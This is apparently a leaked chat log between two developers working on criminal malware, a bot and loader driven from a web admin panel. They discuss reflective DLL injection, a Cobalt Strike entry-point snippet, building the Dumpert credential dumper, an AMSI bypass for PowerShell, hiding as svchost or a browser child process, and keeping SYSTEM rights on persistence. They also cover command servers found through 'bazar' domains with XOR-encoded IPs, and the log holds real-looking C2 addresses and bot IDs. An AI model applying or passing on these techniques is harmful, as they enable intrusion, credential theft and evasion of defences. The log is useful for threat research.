[22.09.21 11:59:08] royal: It's doubtful that DllMain does anything out of the ordinary. After all, after DllMain export functions can be called in a normal program from anywhere.
[22.09.21 12:00:12] royal: Shell code can be written in C say.
[22.09.21 12:00:20] royal: I'll try.
[22.09.21 12:00:29] collin: you can do it in that studio, I was doing test shellcode in it
[22.09.21 12:00:35] collin: native project in one function
[22.09.21 12:00:38] collin: I'll send you an example
[22.09.21 12:00:51] royal: I didn't make a return.
[22.09.21 12:00:54] royal: return
[22.09.21 12:00:55] collin: `native project in one function` - well, or the order of functions to consider
[22.09.21 12:02:14] collin: https://godbolt.org/ more here
[22.09.21 12:03:05] royal: I think to write in C, cut function in hex editor.
[22.09.21 12:03:57] collin: `I didn't make a return.
[22.09.21 14:25:43] royal: I did the shell code by the example and return works there.
[22.09.21 14:25:47] royal: Do you need it?

[9/23/221 10:12:24] royal: Will this export function always be __stdcall? In x64 too?
[23.09.21 10:12:52] royal: This is from a dll for reflexive loading into another process.
[9/23/221 10:13:09] royal: Or it will be WINAPI
[9/23/221 10:13:28] royal: in h86 __stdcall in 64 __cdecl
[9/23/221 10:13:30] collin: WINAPI=__stdcall, it always is
[9/23/221 10:13:47] collin: in x64 fasstcall, __stdcall is ignored
[23.09.21 10:13:56] collin: fastcall*
[9/23/221 10:14:56] collin: `int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);` - this declaration fits to both architectures, I've specified it in my task
[9/23/221 10:18:50] Parameters don't matter?
[23.09.21 10:18:57] royal: Can I use zeros?
[23.09.21 10:19:11] royal: For dll they don't matter by idea.
[23.09.21 10:19:42] royal: It's supposed to learn all the command line itself, etc.
[23.09.21 10:21:26] collin: yes, for now with zeros
[9/23/221 13:20:30] royal: It's an organizational question.

[23.09.21 13:25:52] collin: how long do you want?
[23.09.21 13:28:01] royal: For 2 weeks.
[09/23/221 13:29:06] royal: October 18, for example.
[9/23/221 13:31:06] royal: Test.
[9/23/221 13:31:21] royal: Test.
[9/23/221 13:31:28] royal: For 2 weeks.
October 18, for example.
[23.09.21 13:31:29] collin: you can see.
[9/23/221 13:31:43] collin: from October 18 to 31, okay.
[09/23/221 13:32:02] royal: Done.
[09/23/221 13:32:10] collin: text Silver about it too
[9/23/221 14:23:01] collin: do the build
[09/23/221 14:25:43] collin: stand down for now
[24.09.21 11:55:09] collin: hi!
[24.09.21 11:55:18] collin: more info about run_dll command
[24.09.21 11:55:42] collin: in reflexive start mode in someone else's process - run only in background, timeout is ignored
[24.09.21 11:56:25] royal: That's what I thought, otherwise is it even possible to kill thread in someone else's process?
[24.09.21 11:56:39] royal: If possible, how pale is it?
[24.09.21 11:58:04] collin: I don't know if they do it, I haven't come across any information

https://github.com/k4nfr3/Dumpert

this should be assembled for launching in cobalt, with the right entry point

```
[29.09.21 09:12:19] collin: about the point he wrote earlier:
[29.09.21 09:12:21] collin: ``
The entry point for Cobalt Strike:
#define DLL_API __declspec(dllexport)
extern "C" DLL_API void CALLBACK StartDLL(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
Called as follows:

TStr DllCmdLine;
for(int i = 1; i < argc; i++)
    DllCmdLine += TStr(argv[i]) + (i < argc - 1 ? " : "")
char *OutputData;
int OutputSize;
int *p = &OutputSize;
pStartDLL(HWND(&OutputData), HINSTANCE(&OutputSize), &DllCmdLine[0], SW_MAX + 1);
Entry point blocking: the calling context can be blocked for as long as necessary to complete the function.
```
[29.09.21 09:32:23] royal: Stupidly compile with export function?
[29.09.21 10:05:38] collin: yes, for now
[29.09.21 10:07:05] royal: It creates a file in C:\Windows\Temp
[29.09.21 10:07:28] royal: Should the output be redirected to HWND hwnd instead of file?
[29.09.21 10:08:30] royal: Or rather to return buffer address to hwd, size to hinst?
[29.09.21 10:09:16] royal: Or leave it as it is? The result is a file, as I wrote above, I have this file of 50+ mb.
[29.09.21 10:12:30] collin: `pStartDLL(HWND(&OutputData), HINSTANCE(&OutputSize), &DllCmdLine[0], SW_MAX + 1);` - you mean it?
[29.09.21 10:12:46] royal: Yes.
[29.09.21 10:13:17] collin: check with Silver
[29.09.21 10:23:46] royal: Another clarification. Is DllMain used there in cobalt?
[29.09.21 10:25:15] collin: I haven't heard anything about DllMain
[29.09.21 10:25:39] collin: make it formal with "return TRUE;"
[29.09.21 10:25:46] royal: So nothing will happen in DllMain.
[29.09.21 10:37:42] royal: Done.
[29.09.21 10:39:22] collin: ok
[29.09.21 10:39:58] collin: waiting for what Silver has to say about this problem.

[30.09.21 14:04:44] collin: I remember about it, we should wait for inject (self) mode

[01.10.21 07:57:50] collin: send nick
[01.10.21 07:59:34] collin: make function GlobalOut, not StartW in the source
[01.10.21 07:59:50] collin: because load can be caught in memory after deployment
[01.10.21 08:00:30] royal: OK.
[01.10.21 12:09:23] royal: should I write process id in sysifno now?
[01.10.21 12:10:14] royal: Otherwise how will dll injection be done.
[01.10.21 12:11:22] collin: I think so.
[01.10.21 12:11:35] collin: so print: id, process name, architecture
[01.10.21 12:11:55] royal: OK.
[01.10.21 12:19:08] collin: are you familiar with building with CMakeLists.txt and CMakeRC?
[01.10.21 12:39:10] royal: I build Cmake version of loader for GCC compiler. I don't know what CMakeRC is.

[01.10.21 12:54:02] collin: do me a favor and postpone one small task for now
[01.10.21 12:54:16] collin: this is the solution to the next problem:
[01.10.21 12:54:42] collin: ``.
The program should consist of two modules:
- ``the main .exe
- .dll with some logic, for example displaying a window with the text "Hello!"

The .dll must be packaged as an .exe and must be unpacked and loaded into the body of the process at startup.
IMPOrTANT: dumping the .dll to disk and then loading LoadLibrary is FORBIDDEN! The .dll must be unpacked and set up in memory.

The result of the job must be ONE .exe file (except the source code).
```
[01.10.21 12:54:53] collin: for candidates for new coders to us, the introductory task is so called
[01.10.21 12:55:05] collin: you have to check if his solution matches the given problem
[01.10.21 12:55:38] collin: he's got CMake, I'm very unfamiliar with it
[01.10.21 12:56:04] collin: plus he uses an extra component
[01.10.21 12:56:08] collin: ``
Drop in a DLL as a resource to the exe. You can use Visual Studio project tools to add resources, I used cross-platform CMakeRC
https://github.com/vector-of-bool/cmrc
```
[01.10.21 12:56:12] collin: also a WIL library I understand
[01.10.21 12:56:27] collin: you can build all this and check if it works as intended
[01.10.21 12:56:50] collin: or conclude that nothing works
[01.10.21 12:56:52] royal: Let me see.
[01.10.21 12:58:51] royal: What compiler do you use to build your task?
[01.10.21 12:58:57] royal: MSVC?
[01.10.21 13:00:34] collin: Is there no binding to the compiler?
[01.10.21 13:00:43] collin: it looks like msvc options, but klang is also mentioned
[01.10.21 13:01:52] royal: CMake has no binding to the compiler, it is specified when you start the CMake utility to generate a build script or project.
[01.10.21 13:02:10] royal: On WIndows default is MSVC.
[01.10.21 13:02:23] collin: try it then
[01.10.21 13:08:23] royal: Is the folder cmrc empty?
[01.10.21 13:13:38] collin: yes
[01.10.21 13:13:54] royal: And it's in the project.
[01.10.21 13:14:14] royal: didn't report the files or there is an error in project file CMakeLists.txt
[01.10.21 13:14:41] collin: it looks like he didn't attach the CMakeRC project
[01.10.21 13:14:55] collin: it must be listed in CMakeLists if used?
[01.10.21 13:14:55] royal: There must be at least a CMakeLists.txt file
[01.10.21 13:15:04] royal: Yes.
[01.10.21 13:15:15] collin: so you can't build with the current set?
[01.10.21 13:15:37] royal: I'll try to build without this subfolder.
[01.10.21 13:15:42] collin: but the wil:: name space is not frowned upon?
[01.10.21 13:16:03] royal: It does. I'm installing it now.
[01.10.21 13:16:11] collin: ok
[01.10.21 13:16:19] royal: It's a wrapper over WinApi.
[01.10.21 14:22:33] royal: What should the end result be?
[01.10.21 14:24:16] collin: dll-module in binary form must be inside of exe, when you run exe, it will unroll dll, it will output MessageBox
[01.10.21 14:25:14] collin: i.e. MessageBox should be called when starting the exe
[01.10.21 14:28:07] royal: Who said it works for him?
[01.10.21 14:28:38] collin: yes
[01.10.21 14:28:43] collin: but he could be lying/misleading
[01.10.21 14:28:44] royal: I already get an error when running the library via rundll32.
[01.10.21 14:29:15] collin: me too, but I figured it would be flashed inside the executable
[01.10.21 14:29:19] collin: if you deploy it filelessly
[01.10.21 14:30:21] royal: Oh wait. I'm not looking carefully again.
[01.10.21 14:30:22] collin: this is a variant of reflexive injection "the lib configures itself" I guess
[01.10.21 14:30:34] collin: but I haven't worked with this technique, so I can't say for sure about the code
[01.10.21 14:30:47] royal: You need to specify the process pid when you run ReflectiveInjector.exe
[01.10.21 14:31:07] collin: no, that piece was changed there
[01.10.21 14:31:28] royal: Usage: ReflectiveInjector <process_id>
[01.10.21 14:31:35] collin: there then GetCurrentProcess goes through wil wrapper
[01.10.21 14:31:47] royal: This is what it gives out if I run ReflectiveInjector.exe without parameters
[01.10.21 14:31:53] collin: it must be left over from the project he took as the basis
[01.10.21 14:33:31] collin: is the executable built with a dll inside as a resource?
[01.10.21 14:38:03] royal: I have Release not building memcpy not allowed extrinsic character.
[01.10.21 14:38:15] collin: )
[01.10.21 14:38:16] royal: And Debug doesn't work like you say.
[01.10.21 14:38:18] collin: I had the same.
[01.10.21 14:38:58] royal: I guess it's because it links to WIL and I can't find it as a library.
[01.10.21 14:39:21] royal: WIL is header files only.
[01.10.21 14:39:30] collin: it's in dllc, right? there's no wild there
[01.10.21 14:39:40] collin: wil*
[01.10.21 14:39:54] collin: i built it by adding static memcpy self-written lib
[01.10.21 14:40:01] collin: only built for x64, right?
[01.10.21 14:41:13] royal: so he didn't report the files.
[01.10.21 14:43:09] collin: ``

[01.10.21 14:43:21] collin: try linking to this one
[01.10.21 14:43:28] collin: Release profile
[01.10.21 14:43:48] royal: You can specify architecture in cmake and get a Win32 solution
[01.10.21 14:43:56] collin: maybe not msvc compiler after all
[01.10.21 14:44:02] royal: Defaults to x64.
[01.10.21 14:44:04] collin: it's a trick to pull memcpy
[01.10.21 14:44:26] royal: msvc, he has msvc compiler and linker flags in his project.
[01.10.21 14:44:43] collin: that makes the project 100% incomplete
[01.10.21 14:45:49] royal: Look at CmakeLists.txt file in the project root folder, there:
set(
	BASIC_COMPILE_OPTIONS
		/MP # Multiprocessor compilation
		/W4 # Warnings level
		#/WX # Treat warnings as errors
)
set(
	RELEASE_COMPILE_OPTIONS
		/O2 # Max optimization level
		/Ob3 # Aggressive inlining
		/Oi # Enable intrinsics
		/Ot # Prefer fast code
		/Oy # Omit frame pointers
)
[01.10.21 14:46:13] royal: flags for cl.exe
[01.10.21 14:56:49] royal: encrypts the load?
[01.10.21 14:57:04] royal: The size of the .data section is the size of the dll
[01.10.21 14:57:33] collin: no it must be there
[01.10.21 14:57:45] royal: There is no MZ at the beginning.
[01.10.21 14:58:22] collin: maybe obfuscate it somehow
[01.10.21 14:58:39] collin: via CMakeRC?
[01.10.21 15:11:25] royal: Doesn't work as it should.
[01.10.21 15:12:04] royal: It builds, I don't see any window when I start it. I see output Usage: ReflectiveInjector <process_id>.
[01.10.21 15:13:03] royal: Have him send me project with description how to build. Because it's default if build doesn't work as it should.
[01.10.21 15:13:35] royal: Or he messed up there. If I see Usage output: ReflectiveInjector <process_id> and it shouldn't be you say.
[01.10.21 15:14:33] royal: Do you understand how to use cmrc?
[01.10.21 15:14:58] royal: In the folder cmrc download from here https://github.com/vector-of-bool/cmrc
[01.10.21 15:15:12] royal: CMakeLists.txt
CMakeRC.cmake
[01.10.21 15:16:09] royal: In CMakeLists.txt file comment out everything except "include(CMakeRC.cmake)"
[01.10.21 15:16:52] collin: ok
[01.10.21 15:17:49] collin: that's it, finish the project
[01.10.21 15:18:12] collin: maybe there will be another version corrected later
[01.11.21 07:39:02] collin: hi!
[01.11.21 07:39:43] royal: yes.
[01.11.21 07:41:17] royal: Deletes if only with timeout startup.
[01.11.21 07:41:37] royal: If without it, it forgets about the file and doesn't keep track of it.
[01.11.21 07:46:52] royal: He enters admin. There is a bug. I hit bots and get an exception PHP Warning - yii\base\ErrorException
[01.11.21 07:47:09] royal: Probably because I have no bots there.
[01.11.21 07:47:35] royal: Pressing groups opens a tab with no errors.
[01.11.21 10:24:57] royal: Is this date "Monday, 01 November 2021 10:23:32" right?
[01.11.21 11:30:40] royal: Run dll command doesn't work.
[01.11.21 11:31:11] royal: I give command, press GO, but command doesn't appear in list and doesn't come to bot.
[01.11.21 11:31:32] royal: 0 60 comes instead.
[01.11.21 11:32:18] royal: Do you want to build anyway?
[01.11.21 11:32:35] royal: Yes rundll32
[01.11.21 11:33:25] royal: It worked.
[01.11.21 11:38:52] royal: In general, the command rundll what is repeatedly given and appears in the list of commands bot. There may be problems for the one who will use it.
[01.11.21 11:40:33] royal: Himself try my bot give the command to run dll. Бот 1a25650db9674df5125d8a536245d2b4.
[01.11.21 11:40:45] royal: Try several times.
[01.11.21 11:42:29] royal: Maybe it depends on the account.
[11/11/2011 11:42:49] royal: Now I got another crash. Lags and 504 code.
[11/11/2011 11:43:05] royal: Bot.
[11.11.21 11:44:34] royal: Am I blacklisted again?
[01.11.21 11:46:11] royal: The first address doesn't work 504, the second one does.
[01.11.21 11:47:28] royal: 504 Gateway Time-out
[01.11.21 12:26:09] royal: Collecting. I've been testing the team's work.
[02.11.21 08:17:42] royal: Hi. OTR.
[02.11.21 08:18:22] royal: In bot command 13 "Run Powershell" implement the ability to disable AMSI in powershell.exe process
A sample implementation is attached.
A sample script for testing (causes blocking via AMSI) is attached.

Implementation type: separate mode (set at build stage), disabled by default.
[02.11.21 08:18:35] royal: Send what should be attached.
[02.11.21 08:26:40] royal: I also noticed that not correctly use new command rundll, for example rundll regsvr32 60 ev5.dll DllRegisterServer
[02.11.21 08:27:02] royal: Don't use regsvr32 silent pale, window can lick.
[02.11.21 08:27:28] royal: They write export function, they don't need it.
[02.11.21 10:46:29] royal: Yes.
[02.11.21 10:48:04] royal: I still do.

[02.11.21 10:58:13] royal: Where 1 byte only can be written by letter.
[02.11.21 11:46:06] royal: I checked. And Wild checked.

[02.11.21 11:50:43] royal: Here is the command. No PID after timeout
[02.11.21 11:50:58] royal: Yesterday it worked.
[02.11.21 11:51:34] royal: Because PID should always be there, command is considered as not veon and not executed.
[02.11.21 11:52:10] royal: more precisely it is rejected as incorrect.
[02.11.21 11:52:26] royal: What string?
[02.11.21 11:52:59] royal: It should not be.
[02.11.21 11:53:30] royal: There shouldn't be a filename anywhere.
[02.11.21 11:53:58] royal: This was discussed with Alphonse a long time ago and he removed it. And now it's back.
[03.11.21 09:47:17] royal: And through tor 502 Bad gateway
[03.11.21 09:47:41] royal: It worked on the third try.
[03.11.21 09:49:17] royal: What you gave me for building.
[03.11.21 09:49:55] royal: They don't work periodically, at least the first one. On the third try the request went through.
[03.11.21 15:14:18] royal: Yes.
[03.11.21 15:15:29] royal: I just started it in windows native powershell and nothing yet.
[03.11.21 15:15:59] royal: I was starting with non native powershell before, there was an error, they might be incompatible.
[03.11.21 15:16:12] royal: Silence in native, no output at all.
[03.11.21 15:16:26] royal: May not download.
[03.11.21 15:16:41] royal: And it does not come to amsi.
[03.11.21 15:17:01] royal: How do I check if it works then?
[03.11.21 15:17:09] royal: Which process should I check?
[03.11.21 15:18:04] royal: I have to turn on realtime protection, I have it turned off.
[03.11.21 15:18:29] royal: How do I know if the script worked anyway?
[03.11.21 15:18:47] royal: There is no output.
[03.11.21 15:19:20] royal: Should some process appear?
[03.11.21 15:19:53] royal: This process has connection 116.202.251.52.superbit.host:443
[03.11.21 15:20:21] royal: So it works.
[05/11/21 10:54:06] royal: I looked through shell code. There is classical exception 0xC0000005 ACCESS VIOLATION.
[05.11.21 10:54:42] royal: The code comes in and turns into an array of bytes with no errors.
[05.11.21 10:54:53] royal: After running this shell code.
[05.11.21 11:11:00] royal: Replaced virtualProtect(codeAddr, codeSize, PAGE_EXECUTE, &old) with virtualProtect(codeAddr, codeSize, PAGE_EXECUTE_READWRITE, &old)
[05.11.21 11:11:06] royal: And this shell code worked.
[05.11.21 11:11:34] royal: There were no exceptions, the thread started.
[05.11.21 11:12:42] royal: Such a big shell code is impossible to use, you have to twist to plus in admin.
[05.11.21 11:13:08] royal: To see the response to the command.
[05.11.21 11:19:41] royal: 504 code started coming again.
[05.11.21 11:26:35] royal: It worked.
[05.11.21 11:46:32] royal: I broke the admin. Try giving shell code command to bot 1a25650db9674df5125d8a536245d2b4. Take the shell code from the previous one.
[05/11/21 11:50:02] royal: It worked. It's been working for about 10 times.
[05.11.21 11:50:17] royal: I gave shell code command 10 times and it didn't show up in queue.
[05.11.21 11:50:25] royal: Admin.
[05.11.21 11:51:12] royal: There hangs 1.
[05.11.21 11:51:31] royal: And before that I put 10 times to no avail.
[05.11.21 11:52:08] royal: This happens periodically with rund dll command too.
[08.11.21 10:27:59] royal: Hi.
[08.11.21 10:28:39] royal: Got it.
[11.11.21 07:26:07] royal: Transmits both stdout and stderr.
[11.11.21 07:26:17] royal: In msg
[11.11.21 07:27:07] royal: Like command line, all in one place.
[11.11.21 09:15:15] royal: I think there is no stderr because stdin line ends with null character, it sends much more bytes than admin writes in command.
[11.11.21 09:15:39] royal: If in output string ends with null character, then everything after will not be displayed.
[11.11.21 09:16:29] royal: I'll clarify that.
[11.11.21 09:17:10] royal: It sends 456 bytes, but there is only one line in admin, which is much less than 456 bytes.
[11.11.21 09:22:22] royal: Everything is being mailed

[10.12.21 08:20:22] royal: The fourth paragraph says that there should be a delay of 30-90 seconds between requests for addresses from the list and the first step of the search.

[10.12.21 08:21:03] royal: And on the second and third step should there be a delay between requests for addresses received from bazar?
[10.12.21 08:27:10] collin: on steps 2 and 3 - one connection attempt to each resolved address, no delay between attempts.
[10.12.21 08:27:33] royal: There's one attempt everywhere.
[10.12.21 08:27:53] collin: If the same address is resolved from several bazaars consecutively, for example from domain1.bazar - we try, move to next domain2.bazar.

[12/15/221 11:13:58] royal: About the task when the bootloader is started with elevated rights. Looked at my own, it starts the same way from zakrep with elevated permissions. I don't have to change anything.
[15.12.21 11:15:19] royal: I'll check what permissions do the command processes have, but I think the same as the parent process with elevated rights.
[12/15/21 11:15:35] collin: ok if so
[12/15/21 11:15:49] collin: customer asked me to check it, he said something is wrong
[15.12.21 11:59:32] royal: So when I masquerade as a browser child process, the bot really doesn't work with elevated privileges. But if I myself run for example svchost and masquerading as it, it works with elevated rights. Quick solution is to check what rights launched loader, if elevated, then masquerading as svchost, if not, then as a child process of the browser.
[15.12.21 12:01:22] collin: so it is impossible to build a child browser process with admin rights?
[15.12.21 12:01:28] collin: start
[15.12.21 12:03:23] royal: This needs to be studied, most likely you can. There's a security token in process startup arguments for a reason.
[15.12.21 12:03:40] royal: Fast solution while checking as I wrote above.
[15.12.21 12:05:07] collin: but if browser will be under admin - in any case masking is already lame, because it's visible
[15.12.21 12:06:02] royal: Yes browser under amin is strange.
[15.12.21 12:07:04] collin: let's go for the first option - the way you wrote it
[12/15/221 12:07:27] collin: but you should work on launching browsers under admin, try to achieve it
[12/15/221 12:08:34] collin: I also noticed when you run under svchost - process has a different color
[12/15/221 12:08:48] collin: compared to other svchosts, in Process Explorer
[15.12.21 12:09:08] collin: you can change it, did you look?
[15.12.21 12:11:09] royal: And what does color mean in process explorer?
[15.12.21 12:11:51] collin: process orange - services
[12/15/221:13:11] collin: maybe if you change the parent process to services.exe it will change, and maybe there are other criteria
[12/15/221 12:13:49] royal: And they are all services? There are a lot of them running in the system.
[12/15/21/12:14:15] collin: all of them have services.exe as their parent
[12/15/21 12:15:30] royal: Yeah.

[12/22/221 13:55:10] collin: about the task 479 - added clarification on the first point:
[12/22/221 13:55:40] collin: ``.
The rights of the system account should be preserved (inherited):
1) when a loader is latched and then autorun from the latched account. If it's hard to create a mount with system rights, you can make a mount with administrator rights (Integrity level = High) in the first version.
```
[22.12.21 13:56:09] royal: You don't need to change anything. Right now it works like SYSTEM
[22.12.21 13:56:30] royal: From whom I started it.
[22.12.21 13:58:12] royal: What were the errors if such a task?
[22.12.21 13:58:52] royal: System integrity process
[22.12.21 13:59:01] royal: In report to team 1.
[22.12.21 13:59:13] royal: In my bot.
[22.12.21 13:59:53] collin: thought possible difficulties with it, well, if in BITS it works fine
[22.12.21 14:00:08] collin: in one build fix autorun key in registry, I think there will be problems with it
[22.12.21 14:00:42] royal: The window will pop up I think you have to confirm startup.
[22.12.21 14:01:19] royal: Maybe not, they write it under SYSTEM

[04.02.22 10:15:48] royal: There's no button to add, only delete all
[04.02.22 10:16:46] royal: You should have pressed plus.
[04.02.22 10:20:37] collin: in prefix?
[04.02.22 10:20:55] collin: if there is no prefix, then no button will be added as a new one
[04.02.22 10:21:49] royal: In rules.
[04.02.22 10:21:53] royal:
[04.02.22 10:22:15] collin: no plus button?
[04.02.22 10:22:24] royal: Yes.
[04.02.22 10:22:42] royal: I used it. I added a rule. My boot loader worked.
[04.02.22 10:23:22] collin: ok.
[04.02.22 10:34:23] royal: How do I check my team history?
[04.02.22 10:34:30] royal: There is no button as on the main one.
[04.02.22 10:35:22] collin: team report?
[04.02.22 10:35:29] collin: the plus sign on the right, I have
[04.02.22 10:36:01] royal: Right as on the main Actions column
[04.02.22 10:36:09] royal: I don't have it at all on the test one.
[04.02.22 10:37:03] royal: I have the last Status column
[04.02.22 10:38:03] royal: How will I check the results of commands?
[04.02.22 10:38:40] royal: I see.
[04.02.22 10:38:51] royal: interface is not moving.
[04.02.22 10:38:57] collin: it's customizable column width yes
[04.02.22 10:39:07] royal: It is there if you make a full screen browser.
[04.02.22 10:39:11] collin: but in the bot registry it doesn't work yet
[04.02.22 10:39:50] royal: Scroll only to Status.
[04.02.22 10:40:07] collin: horizontal?
[04.02.22 10:40:14] royal: Yes.
[04.02.22 10:40:29] collin: What resolution
[04.02.22 10:40:32] collin: window width
[04.02.22 10:40:49] collin: try resetting forms, cache, cookies in your browser
[04.02.22 10:43:33] royal: I have nothing saved in tor browser.
[04.02.22 10:44:08] collin: take a screenshot of the problem, describe it and append it to your report
[04.02.22 10:44:38] royal: And columns don't change width.
[04.02.22 10:44:57] royal: I'm trying to change it, nothing happens.
[04.02.22 10:46:33] royal: An interesting thing. In the maximized window changes the width, but not maximized.
[04.02.22 10:48:33] royal: It may be a trick tor browser for anonymity, maybe some data is not passed, like screen resolution.
[04.02.22 10:50:36] royal: 1a25650db9674df5125d8a536245d2b4
[04.02.22 10:50:58] royal: Look at the output of the last command.
[04.02.22 10:51:29] royal: Is this how it should be? No formatting, as bubto in one line without hyphenation everything is written.
[04.02.22 10:52:02] royal: Test.
[04.02.22 10:56:08] collin: history print can glitch with format
[04.02.22 10:56:24] collin: whole report can not be downloaded by the button, it is a bigger bug
[04.02.22 11:30:11] royal: There are no hyphens anywhere in lines, run exe command also has one line. The program outputs with hyphenation, that's for sure.
[04.02.22 11:31:23] collin: I see, it's not critical.
[04.02.22 11:32:04] royal: Whoever will read output will go crazy, if it will be big.
[04.02.22 15:00:31] royal: The tests. There are no questions about the protocol. All commands come as they should and work. Bugs only in the web interface, of which I wrote above.
[04.02.22 15:01:06] collin: ok
[04.02.22 15:01:30] collin: you still have bugs with alignment in runexe report?
[04.02.22 15:02:09] royal: There is this bug everywhere except rundll command.
[04.02.22 15:02:37] royal: run exe, run bat, run powershell, system info bat
[04.02.22 15:03:00] royal: That's weird, I thought they all processed the same way.
[04.02.22 15:03:05] collin: about table width in history, it doesn't show up for me
[04.02.22 15:03:30] collin: so write your OS and browser and tell me the problem again
[04.02.22 15:12:25] royal: Tor Browser 11.0.4 (based on Mozilla Firefox 91.5.0esr) (64 bit)
Windows 10 Home for one language 19044.1466
Screen resolution 5120x2880

Start the Tor Browser, make it not expanded to full screen, go to the Test Bots. See the table with the bots, it does not fit into the window width, the mouse scrolls it to the right, to the maximum where it scrolls to the right edge of the Status column. When you try to change the size of a column or a mouse, the width of the column does not change.

And if you expand the Tor Browser window to full screen, the whole table with bots fits in the window, the width of the columns changes with misha.
[04.02.22 15:15:00] royal: I have an assumption that this is Tor Browser. I have a lot of elements crookedly aligned in mode when window is not maximized to full screen.
[04.02.22 15:18:41] royal: I left.

[11.02.22 12:35:58] royal: Tell me what works, and I'll close the task in redmine.
[11.02.22 12:43:57] collin: one crypt works, I'm testing it now
[11.02.22 12:44:30] royal: So they all worked before when there was void func().
[11.02.22 12:56:28] collin: how often do your static names change?
[11.02.22 12:56:53] collin: task name bits, link in it, parameter to run loeder from bits, parameter when running bot in svchost.exe process
[11.02.22 13:16:08] royal: Parameter to start lowder and bits is always different, it is generated by system. I haven't changed everything else in a long time. They are all obfuscated.
[11.02.22 13:17:53] collin: I once made a questionnaire, there was a point about static names in the system, almost everyone said no and so did you. Who said yes - I gave you a task to fix it.
[11.02.22 13:18:21] collin: I'll add the task later, tell me what to do
[11.02.22 13:19:18] royal: Static names are, like GUID change with every day. Only the bits link didn't change.
[11.02.22 13:19:47] royal: I didn't say not.
[11.02.22 13:21:24] collin: I didn't say they must be changed at least once a week?
[11.02.22 13:21:59] royal: You said to change user-agent.
[11.02.22 13:22:34] collin: okay.
[11.02.22 14:12:42] royal: What about performance?
[11.02.22 14:12:51] royal: Closing task?
[11.02.22 14:12:56] collin: yes crypto works
[11.02.22 14:18:03] royal: Question about 857.
1 - "General info": data in parameters os, arch, cname, uname, locale, tz, group
[11.02.22 14:18:14] royal: parameter group not in system info.
[11.02.22 14:18:21] collin: it should be

[11.02.22 14:19:10] collin: this is from the very first ToR for the bot
[11.02.22 14:19:48] royal: It was prescribed a hundred times this task.
[11.02.22 14:19:58] royal: So I missed it.
[11.02.22 14:29:49] royal: There is no domain item in the task.
[11.02.22 14:30:08] royal: This is a working group.
[11.02.22 14:30:20] royal: Like WorkGroup.
[11.02.22 14:33:34] collin: domain - in flag 1 "Gemeral Info", corrected
[11.02.22 15:21:00] royal: saw bot 8e58bb7018899a06359d20ace7583afa
[11.02.22 15:21:18] royal: There's a hostname 054313581853
[11.02.22 15:21:23] royal: Is that normal?
[11.02.22 15:22:59] collin: I don't know what kind of corp
[11.02.22 15:23:10] collin: it means domain/subdomain name
[11.02.22 15:23:18] royal: do such names exist as a number?
[11.02.22 15:23:18] collin: oh no
[11.02.22 15:23:25] collin: hostname
[11.02.22 15:23:38] collin: you think vin does not allow to create it?
[11.02.22 15:24:05] royal: Maybe it does. I've never seen such name.
[11.02.22 15:28:38] royal: It is allowed. Nine Millions of Domain Names Are "Just Numbers".
[14.02.22 08:05:34] collin: hi!
[14.02.22 08:05:45] collin: in your logged loader build, what time is it written
[14.02.22 08:05:49] collin: local or UTC
[14.02.22 08:06:15] collin: i.e. `2/13/2022 10:45:55 PM Started` is it in UTC?
[14.02.22 08:08:40] royal: The one on the computer.
[14.02.22 08:09:03] royal: So I don't have to worry about time translation.

[14.02.22 08:17:55] collin: where's the thing
[14.02.22 08:21:22] collin: the second point - the lowers don't knock on win7, 8, 8.1. And the bots are fine.

[14.02.22 08:21:28] collin: here are the logs of the runs
[14.02.22 08:21:39] collin: odis can give you access to the test machine
[14.02.22 08:21:51] collin: the problem appeared recently by all appearances, because he says your build was ok a week ago on 7
[14.02.22 08:22:30] collin: we gotta get to the bottom of this situation
[14.02.22 08:25:47] collin: added to redmine task lists for both situations - 867 and 868 deal with them first of all
[14.02.22 08:25:52] royal: There are no addresses in logs.
[14.02.22 08:26:11] royal: 404, 12029 errors in requests.
[14.02.22 08:26:50] collin: well, it can't be, he did two runs every time the lowader error, the bot passes
[14.02.22 08:27:17] royal: So they have different addresses.
[14.02.22 08:27:20] collin: 404 - server answered, cryptography's screwed up.
[14.02.22 08:27:24] royal: Both botn and loader.
[14.02.22 08:27:46] royal: And on win 10 it works.
[14.02.22 08:27:53] royal: So it's not broken.
[14.02.22 08:28:02] collin: on win 10 11 19 works fine
[14.02.22 08:28:37] collin: and the addresses there are the same set for bot and loader, group 16 Friday
[14.02.22 08:29:21] collin: the answer is 404, something about crypto on 7 it doesn't work
[14.02.22 08:29:37] collin: or network api in general

[14.02.22 08:32:18] collin: your address is not properly resolved from bazar
[14.02.22 08:32:59] collin: there is an entry "26.85.198.164" - do xor 254 on each octet - get `228.171.56.90` - address in the skip-list for squatting - skip connection attempts do not
[14.02.22 08:33:05] collin: why 186.73.40.224 ?
[14.02.22 08:34:46] collin: `piynxyek.bazar -> https://45.41.204.147:443` in the third step is normal, but in the second step another algorithm comes from somewhere else...
[14.02.22 08:37:51] royal: The same algorithm. One function resolves on step 2 and on step 3.

[18.02.22 08:24:19] royal: It's done.
[18.02.22 08:24:25] royal: It was a system bug.
[18.02.22 08:26:13] royal: There is no motherboard information on this virtual and if you take it (information) with WMI the program will crash if all returned values of functions will be like SUCCESS.
[18.02.22 08:26:49] royal: I take information from registry now, it doesn't crash that way.
[18.02.22 08:27:05] collin: you mean it works and then crashes?
[18.02.22 08:27:19] collin: or value returns empty/left pointer to data
[18.02.22 08:29:26] royal: I think because there is no this information, and WMI query is executed as successful, it turns out that this query results in pointers to nowhere, and everything crashes on next query result enumeration method.
[18.02.22 08:29:58] royal: I think it's a bug in the system.
[18.02.22 08:30:18] collin: You can't insert check there like if(!pointer)...
[18.02.22 08:30:56] royal: The check passes.
[18.02.22 08:31:00] collin: And data in registry are normal, same values via WMI?
[18.02.22 08:31:11] royal: In and pointers to return value.
[18.02.22 08:31:26] royal: In the registry you just get an empty value and that's it.
[18.02.22 08:31:33] royal: No crash.
